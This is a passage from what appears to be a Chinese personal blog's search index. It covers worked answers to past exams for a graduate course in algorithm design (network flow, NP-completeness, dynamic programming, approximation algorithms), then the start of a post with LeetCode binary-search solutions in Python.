logn<sup>100</sup>，f<sub>2</sub>(n) = 2019n<sup>3</sup> +3<sup>n</sup>，f<sub>3</sub>(n) = 2<sup>nlogn</sup> +log<sup>n</sup>n\n\n   f<sub>4</sub>(n) = 2019√n<sup>2019</sup> ，f<sub>5</sub>(n) = n! + 100n<sup>n</sup> + n<sup>100</sup>，f<sub>6</sub>(n) = log(3<sup>n</sup>logn)\n\n   答：\n\n   f<sub>1</sub>(n) = log<sup>100</sup>n + 100logn = Θ(log<sup>100</sup>n)，f<sub>2</sub>(n) = 2019n<sup>3</sup> +3<sup>n</sup>= Θ(3<sup>n</sup>)\n\n   f<sub>3</sub>(n) = n<sup>n</sup> +log<sup>n</sup>n = Θ(n<sup>n</sup>)，f<sub>4</sub>(n) = Θ(n<sup>1009.5</sup>)\n\n   f<sub>5</sub>(n) =  Θ(n<sup>n</sup>)，f<sub>6</sub>(n) =nlog3 + loglogn = Θ(n)\n\n   显然 f<sub>6</sub>(n) ＜f<sub>4</sub>(n) ＜ f<sub>2</sub>(n) ＜ f<sub>3</sub>(n) = f<sub>5</sub>(n) \n   \n   f<sub>1</sub>(n) ，f<sub>6</sub>(n)同时取对数 ，因此 f<sub>1</sub>(n)＜ f<sub>6</sub>(n)\n   \n   综上所述：f<sub>1</sub>(n)＜ f<sub>6</sub>(n)＜ f<sub>4</sub>(n) ＜ f<sub>2</sub>(n) ＜ f<sub>3</sub>(n) = f<sub>5</sub>(n) \n\n------\n\n### ❸解答题\n\n> 辅以每个章节的真题练习部分食用，效果更佳，又狂肝了一波，睡觉睡觉，狗命要紧。。。\n\n#### 2018\n\n三、将下列6个函数按渐近增长率由低至高进行排序，要求写出判断依据（8分）\n\n![](https://img.jwt1399.top/img/202112071844753.png)\n\nf<sub>1</sub>(n) = √n + log<sup>100</sup>n = O(√n)\n\nf<sub>2</sub>(n) = 2<sup>logn</sup> * 2<sup>loglogn</sup> = nlogn\n\nf<sub>3</sub>(n) = 100logn + nlog3 = O(n)\n\nf<sub>4</sub>(n) = O(3<sup>n</sup>)、f<sub>5</sub>(n) = 100log<sup>2</sup>n、f<sub>6</sub>(n) =  O(n!)\n\n(1)显然 f<sub>3</sub>(n) ＜ f<sub>2</sub>(n) ＜ f<sub>4</sub>(n)＜f<sub>6</sub>(n) \n\n(2)f<sub>5</sub>(n) 是对数的幂，f<sub>1</sub>(n) 是幂函数，因此 f<sub>5</sub>(n)＜ f<sub>1</sub>(n)\n\n综上所述： f<sub>5</sub>(n) ＜ f<sub>1</sub>(n)＜ f<sub>3</sub>(n) ＜ f<sub>2</sub>(n) ＜ f<sub>4</sub>(n)＜f<sub>6</sub>(n) \n\n------\n\n四、求如下有向图中s和t间的最小割，其中边上的数字表示边的容量。要求给出最少两个中间计算步骤（8分）。\n\n![](https://img.jwt1399.top//img/20211016201310.png)\n\n将最小割问题转化为最大流问题\n\n1增广路径：(*s*, *u*, *t*)，流量值+5\n\n2增广路径：(*s*, *x*, *t*)，流量值+5\n\n3增广路径：(*s*, *v*, *w*, *t*)，流量值+8\n\n4增广路径：(*s*, *u*, *w*, *v*, *x*, *t*)，流量值+3\n\n![](https://img.jwt1399.top//img/20211016201317.png)\n\n最小割为**[ {*s*, *u*}，{*w*, *v*, *x*, *t*} ]** 容量为 **21**\n\n------\n\n五、对某个输入大小为n的问题有如下三个分而治之算法：\n\n（1）算法1将该问题分成5个子问题，子问题大小为n/5，将子问题的解合并得到上一级问题的解需要O(n<sup>2</sup>)时间；\n（2）算法2将该问题分成4个子问题，子问题大小为n/2，将子问题的解合并得到上一级问题的解需要O(n)时间；\n（3）算法3将该问题分成2个子问题，第一个子问题大小为n/3，第二个子问题大小为2n/3，将子问题的解合并得到上一级问题的解需要O(n)时间。\n请分析以上3个算法的运行时间。（6分）\n\n答：\n\n(1) T(n) = 5T(n/5) + n<sup>2</sup>\n\na = 5，b = 5 ，f(n) =  n<sup>2</sup>，n<sup>log<sub>b</sub>a</sup> = n<sup>log<sub>5</sub>5</sup> = n < f(n)\n\n再判断是否满足不等式：af(n/b) ≤ cf(n)，代入f(n) = n<sup>2</sup>\n\nn<sup>2</sup>/5和cn<sup>2</sup>，当 c ≥ 1/5 即可满足 af(n/b) ≤ cf(n) 的关系\n\n因此 **T(n) = Θ(f(n)) = Θ(n<sup>2</sup>)**\n\n(2) T(n) = 4T(n/2) + n\n\na = 4，b = 2 ，f(n) =  n，n<sup>log<sub>b</sub>a</sup> = n<sup>log<sub>2</sub>4</sup> = n<sup>2</sup> > f(n)\n\n存在 f(n) = O(n<sup>log<sub>b</sub>a-ε</sup>) = O(n<sup>log<sub>2</sub>4-2</sup>)，ε = 2\n\n因此 **T(n) = Θ(n<sup>log<sub>b</sub>a</sup>) = Θ(n<sup>2</sup>)**\n\n(3) T(n) = T(n/3) + T(2n/3) + n\n\nT(n) = 3T(n/3)  + n\n\na = 3，b = 3 ，f(n) =  n，n<sup>log<sub>b</sub>a</sup> = n<sup>log<sub>3</sub>3</sup> = n = f(n)\n\n因此 **T(n) = Θ(n<sup>log<sub>b</sub>a</sup>logn) = Θ(nlogn)**\n\n------\n\n六、对于三着色问题（对一个图的顶点进行三种颜色着色使得相邻两个点的颜色不一样），若存在一个多项式时间算法判断一个图是否可以三着色，则存在一个多项式时间算法对可以进行三着色的图找到一个可行的三着色。 （8分）               \n\n答：\n\n解法一：不断加边进去然后进行判断，直到不能加边为止。这样三种颜色的点就是图中三个独立集。 \n\n解法二：不断将两个不相邻的点合并成一个点然后进行判断，直到不能再合并为止。最后剩下三个点。\n\n------\n\n 七、给出一个图和一个整数k，问是否可以在这个图上删除k个点使得剩余图上没有三角形（含有3个顶点的圈）。证明这个问题是NP完全的。 （10分）\n\n答：从点覆盖问题规约过来（2分）。\n\n对于一个点覆盖实例 G，构造一个该问题实例 G'；（1分）\n对 G 中每一条边 ab，都添加一个新的顶点 c 然后连成三角形 abc。（4分）\n说明 G 存在大小为 k 的点覆盖当且仅当 G' 存在一个大小为 k 的解。（3分）\n\n------\n\n![](https://img.jwt1399.top/img/202112081252104.png)\n\n（1）令计算**A<sub>1</sub> x A<sub>2</sub> x A<sub>3</sub> x ... x A<sub>n</sub>**所需要的最少乘法次数为*m*[*i*, *j*] \n\n​\t\t\t则递归关系式为![](https://img.jwt1399.top//img/20211011201529.png)  \n\n （2）\n\n| m(*i*, *j*) | *j* = 1 | *j* = 2 | *j* = 3 | *j* = 4 | *j* = 5 |\n| ----------- | ------- | ------- | ------- | ------- | ------- |\n| *i* = 1     | 0       | 1440    | 3360    | 4000    | `5856`  |\n| *i* = 2     | /       | 0       | 2400    | 2800    | 4800    |\n| *i* = 3     | /       | /       | 0       | 1600    | 2880    |\n| *i* = 4     | /       | /       | /       | 0       | 3200    |\n| *i* = 5     | /       | /       | /       | /       | 0       |\n\n 将对应`m(i,j)`的断开位置`k`记为`s(i,j)`\n\n| *s*(*i*, *j*) | *j* = 1 | *j* = 2 | *j* = 3 | *j* = 4 | *j* = 5 |\n| ------------- | ------- | ------- | ------- | ------- | ------- |\n| *i* = 1       | /       | 1       | 2       | 2       | `2`     |\n| *i* = 2       | /       | /       | 2       | 2       | 2       |\n| *i* = 3       | /       | /       | /       | 3       | `4`     |\n| *i* = 4       | /       | /       | /       | /       | 4       |\n| *i* = 5       | /       | /       | /       | /       | /       |\n\n s(1,5) = 2 因此矩阵链在A<sub>2</sub>和A<sub>3</sub>之间断开，则加括号方式为 **(A<sub>1</sub>A<sub>2</sub>)(A<sub>3</sub>A<sub>4</sub>A<sub>5</sub>)**\n\ns(3,5) = 4 因此矩阵链在A<sub>4</sub>和A<sub>5</sub>之间断开，则加括号方式为 **(A<sub>1</sub>A<sub>2</sub>)((A<sub>3</sub>A<sub>4</sub>)A<sub>5</sub>)**\n\n最优加括号方式为**(A<sub>1</sub>A<sub>2</sub>)((A<sub>3</sub>A<sub>4</sub>)A<sub>5</sub>)**\n\n------\n\n#### 2019\n\n四、简单证明定价算法（Pricing method）求解带权重的点覆盖（Weighted Vertex Cover）问题是2倍近似的。\n\n答： S 为算法终止时所有紧节点的集合。易得 S 是顶点覆盖（反证：如果某条边没有被覆盖到，则其两个端点都没有覆盖很紧，算法不会终止）\n\nw(S) 等于所选的节点的权值之和，等于所选节点所对应的边权之和，可以把它放大到所有节点对应边权之和，这样因为一条边 (u, v) 在 u 上算过一次后还要在 v 上算一次，所以等于边权和的两倍。再由上面公平引理可得。\n\n![](https://img.jwt1399.top/img/202111131352401.png)\n\n∴ 定价算法是2倍近似算法\n\n------\n\n五、证明独立集问题（给定一个图，问图中是否存在k个顶点的子集，使得这个子集中任意两个顶点之间在原图中都不存在边）是NP完全的。\n\n答：从点覆盖问题规约过来\n\n**⇒** \n\n​\tS 是图 G 的任一独立集\n​\t则任意边 (u,v) ∈ E，有u ∉ S 或 v ∉ S 或 u,v 都 ∉ S；那么 u∈V-S 或 v∈V-S 或 u,v 都 ∈ S\n​\t所以图的任意边 (u,v) 至少有一个顶点在集合 V-S 中，即集合 V-S 是一个顶点覆盖\n\n**⇐** \n\n​\tV-S 是图 G 的任一顶点覆盖\n​\t则任意边 (u,v) ∈ E，有 u ∈ V-S 或 v ∈ V-S 或 u,v 都 ∈ V-S ；那么 u ∉ S 或 v ∉ S 或 u,v 都 ∉ V-S\n​\t所以图的任意边至少有一个端点不在集合 S 中，集合 S 是一个独立集\n\n∴  Vertex-Cover ≤<sub>p</sub> Independent Set，即独立集问题NP完全的\n\n------\n\n六、求如下有向图中s和t间的最小割，其中边上的数字表示边的容量，要求给出最少两个中间计算步骤(8分)。\n\n![](https://img.jwt1399.top/img/202112071837771.png)\n\n将最小割问题转化为最大流问题\n\n1增广路径：(*s*, *u*, *v*, *t*)，流量值+10\n\n2增广路径：(*s*, *y*, *z*, *t*)，流量值+10\n\n3增广路径：(*s*, *w*, *x*, t)，流量值+18\n\n4增广路径：(*s*, *y*, *x*, *w*, *v*, *t*)，流量值+4\n\n最小割为**[ {*s*,*y*,*z*}，{*w*,*x*,*u*,*v*,*t*} ]** 容量为 **10+10+18+4=42**\n\n------\n\n七、证明图二着色问题（是否能给一个图的顶点进行两种颜色着色使得任意两个相邻顶点都有不同的颜色）是属于P的。(8分)\n\n如果只用2种颜色，那么确定一个顶点的颜色之后，和它相邻的顶点的颜色也就确定了。因此，选择任意一个顶点出发，依次确定相邻顶点的颜色，就可以判断是否可以被2种颜色着色了。这个问题如果用深度优先搜索的话，能够简单地实现。\n\n------\n\n![](https://img.jwt1399.top//img/20211013180909.png)\n\n设 `p(j)` 为与工作 j 相容的最大的工作 i 且 i < j 。`OPT(j)`表示前 j 个工作 ( 1,2,3,…,j )的最大的工作权重。则递归关系式为：\n\n![](https://img.jwt1399.top//img/20211013181235.png)\n\n依据递推公式，计算出  `p(j)`、`OPT(j)`\n\n![](https://img.jwt1399.top//img/20211013181844.png)\n\n因为 OPT(17) = 50 ，因此**最大权重之和为 50**\n\nOPT(17) = OPT(16) = OPT(15) = 50 ，选择活动 15，p(15) =13；\n\nOPT(13) = OPT(12) = 45 ，选择活动 12，p(12) = 7；\n\nOPT(7) = OPT(6) = 25 ，选择活动 6，p(6) = 3；\n\nOPT(3) = 18 ，p(3) = 0，选择活动 3，且选择完毕。\n\n因此**最优活动子集为 3、6、12、15**\n\n------\n\n九、对于三着色问题，若存在一个多项式时间算法判断一个图是否可以三着色，则存在一个多项式时间算法对可以进行三着色的图找到一个可行的三着色。\n\n解法一：不断加边进去然后进行判断，直到不能加边为止。这样三种颜色的点就是图中三个独立集。  \n\n解法二：不断将两个不相邻的点合并成一个点然后进行判断，直到不能再合并为止。最后剩下三个点。\n\n------\n\n#### 2020\n\n三、给定任意连通的无向有权图G，每条边上的权重c(e)都是不同的整数。G的最小生成树是G的一个连通的、无圈的、边的权重之和最小的包含图中所有顶点的子图。如果e\\*是图G上权重最小的边，那么一定有一棵图G的最小生成树T包含边e*。请问这个命题是否正确,如果正确，请给出证明。如果不正确,请给出反例。(8分)\n\n答：正确\n\n------\n\n四、工厂s生产的商品通过下图表示的运输网络运送到市场t，网络中边上的数值表示单位时间可以通过该边的商品数量的上限，求单位时间内从工厂s到市场t能运送的最大商品总量。要求给出求解过程(给出每条增广路径及其增加的流量值)。(8分)\n\n![](https://img.jwt1399.top/img/202112071837710.png)\n\n1增广路径：(*s*, *s1*, *t*, *v1*, *t1*, *t*)，流量值+10\n\n2增广路径：(*s*, *s2*, *v5*, *t2*, *t*)，流量值+10\n\n3增广路径：(*s*, *s1*, *v2*, *v3*, *v4*, *t1*, *t*)，流量值+5\n\n4增广路径：(*s*, *s2*, *v2*, *v1*, *t1*, *t*)，流量值+4\n\n5增广路径：(*s*, *s2*, *v5*, *v3*, *v4*, *t2*, *t*)，流量值+3\n\n**最大流 10 + 10 + 5 + 4 + 3 = 32**\n\n------\n\n五、若给定两个序列 X = (x<sub>1</sub>,x<sub>2</sub>,x<sub>3</sub>,...,x<sub>n</sub>) 和 Y = (y<sub>1</sub>,y<sub>2</sub>,y<sub>3</sub>,...,y<sub>m</sub>) 、如果对于所有 j = 1,2,3,.,m-1 有 y<sub>j </sub>< y<sub>j+1</sub> 并且存在一个严格递增下标序列 (i<sub>1</sub>,i<sub>2</sub>,i<sub>3</sub>,...,i<sub>k</sub>) 使得对于所有 j = 1,2,3,…,m 有 y<sub>j</sub> = x<sub>i </sub>，则称 Y 是 X 的单调递增子序列。(8分)\n\n(1)给出动态规划算法求给定序列最长单调递增子序列长度的递归关系式。\n\n对于数组序列 Y<sub>i</sub> ( 1 ≤ i ≤ m ) ，令 dp[i] 表示以第 i 个数 Y<sub>i</sub> 结尾的最长递增子序列的长度。那么，我们考虑以第 i 个数 Y<sub>i</sub>  结尾的最长递增子序列，它在这个序列中的前一个数 Y<sub>j</sub> ( 1 ≤ j < i )，所以，如果我们已经知道了 dp[j]，那么就有 dp[i] = dp[j] + 1 。显然，我们还需要满足 Y<sub>j</sub> < Y<sub>i</sub>，这个递增的限制条件。\n\n递归关系式：dp[i] = max<sub>j=1</sub>( dp[j] ∣ Y<sub>j</sub> < Y<sub>i</sub> ) + 1\n\n(2)求解序列(a,l,g,o,r,i,t,h,m)的最长单调递增子序列,画出求解过程表格。\n\n![](https://img.jwt1399.top/img/image-20211208230832866.png)\n\n最长单调递增子序列：a，l，o，r，t 或 a，g，o，r，t\n\n------\n\n六、判定问题A：给定包含奇数个结点的简单无向图，判断其是否包含哈密尔顿圈；判定问题B：给定包含偶数个结点的简单无向图，判断其是否包含哈密尔顿圈；证明问题A可多项式归约到问题B。\n\n设奇数个节点的简单无向图为 G。\n\n构造方法为：随机在 G 中选择一个点 u，假设这个点 u 存在 k 条边，我们断开一条边添加一个点 w，将 w 连接到断开边的两个顶点，这样便构造了一个偶数个顶点的图 G'，依次断开这 k 条边加点，这样我们可以构造 k 个 G' ，则在这 k 个 G' 中肯定能找到一个 G' 存在一条边 (u,v) 是在哈密尔顿圈中，则这个图 G' 肯定满足奇数结点的简单无向图包含哈密尔顿当且仅当偶数结点的简单无向图包含哈密尔顿。\n\n大家可以在评论区留下你想法，一起交流！\n\n------\n\n七、如果存在判断任意简单无向图是否存在哈密尔顿圈的多项式时间算法，请你设计构造任意简单无向图的哈密尔顿圈（如果存在的话）的多项式时间算法。\n\n算法：\n\n//设该判断算法为A\nS 初始化为空集；\n首先算法 A 判断图 G 中是否存在哈密尔顿圈，如果不存在则算法结束，如果存在则继续寻找哈密尔顿圈；\nFor every edge e in G {\n\t如果 G – {e}中不存在哈密尔顿圈，则将 e 添加到集合 S 中；\n\t否则 G = G – {e}；\n} \n最终所得集合 S 中的所有边构成图 G 的哈密尔顿圈。\n\n------\n\n八、给定正整数集合 A = {a<sub>1</sub>,a<sub>2</sub>,a<sub>3</sub>,…,a<sub>n</sub>} 和正整数 b，b ≥ max {a<sub>1</sub>,a<sub>2</sub>,a<sub>3</sub>,…,a<sub>n</sub>}。当集合 A 的子集 S∈A 中的元素之和小于等于 b 时，即 ∑<sub>a<sub>i</sub>∈S[i]</sub> a<sub>i</sub>≤b，我们称 S 为可行集。请寻找元素之和最大的可行集 S 。例如，A = {8,2,4}，b= 11，则最优的可行集为 S = {8,2}，最优解为 8＋2=10 (10分)\n\n(1)下面是求解这个问题的算法。集合 S 初始为空集；按照下标 i 从小到大的顺序依次考察集合 A 中的每个整数 a<sub>i</sub>，如果 α<sub>i</sub> + ∑<sub>a<sub>k</sub>∈S</sub> a<sub>k</sub>＜b ，则将 a<sub>i </sub>添加集合 S 中，即 S = S U {a<sub>i</sub>}。证明这个算法不是1/2倍近似算法。(3分)\n\n------\n\n设集合 A = {1，4}，b = 4\n\n根据该算法求得可行集 S = {1} ，解为 ∑S = 1 \n\n​           而最优可行解 S* = {4}，最优解 ∑S* = 4\n\n⇒ ∑S = (1/4)∑S* < (1/2)∑S*\n\n∴该算法不是1/2倍近似算法\n\n------\n\n(2)为该问题设计O(nlogn)时间复杂度的近似算法，并证明该算法是1/2倍近似算法(7分)\n\n------\n\n在 (1) 中 所给算法基础上对集合 A 进行降序归并排序[O(nlogn)]\n\n即： a<sub>1</sub>＞a<sub>2</sub>＞a<sub>3</sub>＞…＞a<sub>k</sub>＞a<sub>k+1</sub>＞...＞a<sub>n</sub>\n\n证明：设 a<sub>k</sub> 为可行集最后一个元素\n\na<sub>k </sub>≥ a<sub>k+1 </sub>⇒ ∑S ≥ a<sub>k+1 </sub>   ------①\n\na<sub>k</sub> 为可行集最后一个元素 ⇒ ∑S ≥ b - a<sub>k+1 </sub>------②\n\n①+② ： ∑S ≥ (1/2)b ，再又 b ≥ ∑S*\n\n⇒∑S ≥ (1/2)∑S*\n\n∴ 该算法是 1/2 倍近似算法\n\n------\n\n#### 2021\n\n> 考试结束啦，考得一塌糊涂，以下是我的回忆\n\n大题：\n\n- 渐进增长率排序\n\n- 矩阵连乘，求最小计算次数和最优加括号方式\n\n- 贪心算法正确性证明(找零钱)\n\n- 分治算法(类似2020年L型骨牌覆盖)\n- 网络流(跟2020年的图相似)\n- 归约(3着色归约到k着色)\n- 自归约(支配集)\n- 近似算法(给了一个算法，证明不是1/2倍算法)\n- 最大连续子序列(给出递归关系并求解)\n\n## ⑩总结&感谢\n\n看到这里你已经看完了所有正文部分了，相信你对算法设计也有了大致的了解，还是希望此文或多或少对你产生了一些帮助吧，这也是小简写此文的初衷之一。后面的内容是本文的版本管理记录，记录了小简写此文的过程，然后是本文的参考书籍和参考文章，最后是读者对小简的赞助渠道。（赞助将用于本博客运营【CDN和OBS续费】）\n\n首先感谢各位前辈所写文章，没有他们本文也无法完成，其次自从文章开放以来，收到很多读者对文章错误指正的消息以及收到部分读者的赞助，这里就不一一列出了，小简在此真诚的感谢大家！🙏🙏\n\n最后还想送给读者一句话，慢慢来，比较快！\n\n## ⑪版本管理\n\n### v 1.0(2021-10-17)\n\n- 初步构建算法笔记`基本框架`\n- 完成`算法引论`、`算法复杂度`、`网络流`全部章节撰写\n- 完成`贪心算法`、`分治算法`、`动态规划`部分章节撰写\n\n### v 1.1(2021-10-21)\n\n- 修复若干`已知错误`(感谢@tzj、@whh)\n- 优化若干`小细节`\n- 完善`渐近增长率`比较习题解答\n- 新增`动态规划`真题练习\n- 新增`任意流`与`任意割`关系\n\n### v 1.2(2021-11-12)\n\n- 新增`判断问题`和`优化问题`概念\n- 新增`NP完备性`理论章节\n- 新增`01背包`问题\n- 完善`动态规划`分析\n- 新增`近似算法`部分章节\n\n### v 1.3(2021-11-27)\n\n- 完善`分治算法`章节\n- 新增`历年期末真题`章节\n- 完善`近似算法`章节\n- 完善贪心算法`正确性证明`\n- 优化整体`文章结构`\n- 修改若干`已知错误`(感谢@whh)\n\n### v 1.4(2021-12-07)\n\n- 优化`NP完备性理论`章节\n- 完善`历年期末真题`章节\n- 修改若干`已知错误`(感谢若干不知名读者)\n\n### To Do\n\n- [ ] 完善NP完备性理论章节\n- [ ] 完善近似算法章节\n\n## ⑫Reference📖\n\n**书籍**\n\n- 《算法设计》 Kleinberg，J. ，Tardos，E.  著；张立昂，屈婉玲 译\n- 《计算机算法设计与分析》王晓东 著\n- 《算法图解》 Aditya Bhargava 著 ；袁国忠 译\n- 《大话数据结构》程杰 著\n\n**贪心算法**\n\n- [AI产品经理必修——揭开算法的面纱（贪心算法）](http://www.woshipm.com/pmd/4044055.html)\n- [贪心算法刷完这些题目就够了 - SegmentFault 思否](https://segmentfault.com/a/1190000038224322)\n- [五大经典算法|2.贪心算法 - 张浩在路上](https://imzhanghao.com/2020/04/15/5-classic-algorithms-2-greedy-algorithm/)\n- [活动安排问题-计算机算法_笨手笨脚°的博客-CSDN博客](https://blog.csdn.net/qq_43424037/article/details/107175891)\n- [ 贪心算法的正确性证明](https://blog.csdn.net/pkueecscss/article/details/88578060)\n- [ACM--贪心算法--活动安排问题_戎码人生-CSDN博客](https://blog.csdn.net/qq_26891045/article/details/51025619)\n- [活动安排问题贪心证明_AKGWSB 's blog-CSDN博客](https://blog.csdn.net/weixin_44176696/article/details/105705481)\n- [USTC-算法基础-贪心算法](http://staff.ustc.edu.cn/~lszhuang/alg/ch16.pdf)\n\n**分治**\n\n- [【算法16】递归算法的时间复杂度终结篇](https://www.cnblogs.com/python27/archive/2011/12/09/2282486.html)\n- [主定理(Master Theorem) - 知乎](https://zhuanlan.zhihu.com/p/113406812)\n- [算法设计与分析 - 主定理 - HIIM - 博客园](https://www.cnblogs.com/HIIM/p/12499319.html)\n\n**动态规划**\n\n- [动态规划---＞矩阵连乘问题](https://blog.csdn.net/wu246051/article/details/111464029?spm=1001.2014.3001.5501)\n- [矩阵连乘问题-动态规划](https://blog.csdn.net/qq_43424037/article/details/106971000)\n- [ 算法之动态规划，问题二：带权重的任务安排问题_我爱加菲猫](https://blog.csdn.net/weixin_39956356/article/details/101623749)\n- [动态规划算法 | 航行学园 ](http://www.voycn.com/article/dongtaiguihuasuanfa)\n- [动态规划算法_bajiaoyu517的博客](https://blog.csdn.net/bajiaoyu517/article/details/109524684)\n- [算法之动态规划，问题三：0 1 背包问题_我爱加菲猫](https://blog.csdn.net/weixin_39956356/article/details/101695289)\n- [最长公共子序列问题和最长公共子串问题 - Excaliburer - 博客园](https://www.cnblogs.com/wangkundentisy/p/9346376.html)\n\n**网络流**\n\n- [网络流问题基础 Network Flow Problems](https://www.bilibili.com/video/BV1K64y1C7Do/?spm_id_from=333.788.recommend_more_video.0)\n- [网络流算法简单入门 - 辰星凌 - 博客园](https://www.cnblogs.com/Xing-Ling/p/11487554.html)\n- [网络流简介 - OI Wiki (oi-wiki.org)](https://oi-wiki.org/graph/flow/)\n\n**NP完备性理论**\n\n- [ 算法设计与分析-归约与复杂度的NP问题以及近似算法_lyly1995的博客](https://blog.csdn.net/lyly1995/article/details/109959064?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link)\n- [多项式时间归约 | | 清水寺修行生活记录](https://www.ivdone.top/article/57.html)\n- [多项式规约_小菜菜forever的博客-CSDN博客](https://blog.csdn.net/qq_37657182/article/details/102969574)\n- [算法设计与分析笔记之独立集问题 - 简书](https://www.jianshu.com/p/ddae993cc065)\n- [多项式规约——续_小菜菜forever的博客-CSDN博客](https://blog.csdn.net/qq_37657182/article/details/103001996)\n- [算法设计与分析笔记之整数规划](https://www.jianshu.com/p/024892e7cf04)\n- [高级算法 | AdAlgo ](https://sailist.github.io/AdAlgo/)\n\n**近似算法**\n\n- [算法设计与分析之近似算法_猿归林的博客-CSDN博客](https://blog.csdn.net/qq_44075108/article/details/110604404?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1.no_search_link&spm=1001.2101.3001.4242.2)\n- [近似算法_小菜菜forever的博客-CSDN博客](https://blog.csdn.net/qq_37657182/article/details/103056025?spm=1001.2014.3001.5502)\n- [算法基础 - 简书](https://www.jianshu.com/p/dac9620ec051)\n- [Yang的后花园](http://zhangxiaoyang.me/categories/intro-to-algorithms-tutorial/intro-to-algorithms-tutorial-9.html)\n- [ustc.edu.cn](http://staff.ustc.edu.cn/~xiaomj/teaching/sf10.pdf)\n- [算法设计与分析笔记之近似算法 - 简书](https://www.jianshu.com/p/d8d7aa16f53f)\n\n## ⑬Sponsor❤️\n\n本文是 UESTC 研一 《高级算法设计与分析》课程总结，总结得不一定完善不一定完美，但是从查阅资料，到画图构思，再到文章编写前后也经历了大概一个多月的时间，在这个喧嚣浮躁的时代，个人博客越来越没有人看了，写博客感觉一直是用爱发电的状态。如果你恰巧财力雄厚，感觉本文对你有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用。\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>\n  </tr>\n</tbody></table>\n\n\n","tags":["算法"],"categories":["结构-算法"]},{"title":"LeetCode 算法入门","url":"/posts/9409.html","content":"\n感觉自己的算法和编程太弱了😭，故每天在 LeetCode 上刷一两道算法题，希望慢慢提高自己的算法能力和编程能力，从简单的题目开始慢慢刷吧，看看自己能坚持多久，fighting是💪！！！\n\n## 二分查找\n\n### 704. 二分查找\n\n#### 题目\n\n给定一个 n 个元素有序的（升序）整型数组 nums 和一个目标值 target  ，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回 -1。\n\n\n示例 1:\n\n```\n输入: nums = [-1,0,3,5,9,12], target = 9\n输出: 4\n解释: 9 出现在 nums 中并且下标为 4\n```\n\n示例 2:\n\n```\n输入: nums = [-1,0,3,5,9,12], target = 2\n输出: -1\n解释: 2 不存在 nums 中因此返回 -1\n```\n\n#### 解答\n\n二分查找是一种基于比较目标值和数组中间元素的教科书式算法。\n\n如果目标值等于中间元素，则找到目标值。\n如果目标值较小，继续在左侧搜索。\n如果目标值较大，则继续在右侧搜索。\n\n```python\nclass Solution:\n    \"\"\"二分查找\"\"\"\n    def search(self, nums: List[int], target: int) -> int:\n        left, right = 0, len(nums) - 1\n        while left <= right:\n            mid = left + ((right -left) >> 1)\n            if nums[mid] == target:\n                return mid\n            elif target < nums[mid]:\n                right = mid - 1\n            else:\n                left = mid + 1\n        return -1\n```\n\n- 1、循环条件： `left <= right`\n  - 循环条件包含了 `left == right`的情况，则我们必须在每次循环中改变 `left` 和 `right`的指向，以防止进入死循环。\n- 2、循环终止条件包括：\n  - 找到了目标值\n  - `left > right` （这种情况发生于当left, mid, right指向同一个数时，这个数还不是目标值，则整个查找结束。）\n- 3、中间位置计算： `mid = left + ((right -left) >> 1)`\n  - `left + ((right -left) >> 1)` 其实和 `(left + right) / 2`是等价的，这样写的目的一个是为了防止 `(left + right)`出现溢出，用右移操作(`>>`)替代除法提升了性能。\n- 4、左边界更新：`left = mid + 1`\n- 5、右边界更新： `right = mid - 1`\n- 6、返回值： `mid / -1`\n\n#### 复杂度\n\n时间复杂度：$\\mathcal{O}(\\log n)$​\n\n空间复杂度：$\\mathcal{O}(1)$\n\n### 278. 第一个错误的版本\n\n#### 题目\n\n你是产品经理，目前正在带领一个团队开发新的产品。不幸的是，你的产品的最新版本没有通过质量检测。由于每个版本都是基于之前的版本开发的，所以错误的版本之后的所有版本都是错的。\n\n假设你有 `n` 个版本 `[1, 2, ..., n]`，你想找出导致之后所有版本出错的第一个错误的版本。\n\n你可以通过调用 `bool isBadVersion(version)` 接口来判断版本号 `version` 是否在单元测试中出错。实现一个函数来查找第一个错误的版本。你应该尽量减少对调用 API 的次数。\n\n示例 1：\n\n```\n输入：n = 5, bad = 4\n输出：4\n解释：\n调用 isBadVersion(3) -> false \n调用 isBadVersion(5) -> true \n调用 isBadVersion(4) -> true\n所以，4 是第一个错误的版本。\n```\n\n示例 2：\n\n```\n输入：n = 1, bad = 1\n输出：1\n```\n\n\n提示：\n\n```\n1 <= bad <= n <= 231 - 1\n```\n\n#### 解答\n\n将左右边界分别初始化为 1 和 n，其中 n 是给定的版本数量。设定左右边界之后，每次我们都依据左右边界找到其中间的版本，检查其是否为正确版本。如果该版本为正确版本，那么第一个错误的版本必然位于该版本的右侧，我们缩紧左边界；否则第一个错误的版本必然位于该版本及该版本的左侧，我们缩紧右边界。直到 left=right，只剩下一个数了，这个数就是第一个错误的。\n\n```python\nclass Solution:\n    def firstBadVersion(self, n):\n        \"\"\"\n        :type n: int\n        :rtype: int\n        \"\"\"\n        left, right =1, n\n        while left < right: \n            mid = left + ((right -left) >> 1)\n            if isBadVersion(mid):\n                right = mid     # 答案在区间 [left, mid] 中\n            else:\n                left = mid + 1  # 答案在区间 [mid+1, right] 中\n        return left             # 此时有 left == right，区间缩为一个点，即为答案\n```\n\n#### 复杂度\n\n- 时间复杂度：$\\mathcal{O}(\\log n)$​，其中 n 是给定版本的数量。\n- 空间复杂度：$\\mathcal{O}(1)$。我们只需要常数的空间保存若干变量。\n\n### 35. 搜索插入位置\n\n#### 题目\n\n给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。\n\n请必须使用时间复杂度为 O(log n) 的算法。\n\n示例 1:\n\n```\n输入: nums = [1,3,5,6], target = 5\n输出: 2\n```\n\n示例 2:\n\n```\n输入: nums = [1,3,5,6], target = 2\n输出: 1\n```\n\n示例 3:\n\n```\n输入: nums = [1,3,5,6], target = 7\n输出: 4\n```\n\n示例 4:\n\n```\n输入: nums = [1,3,5,6], target = 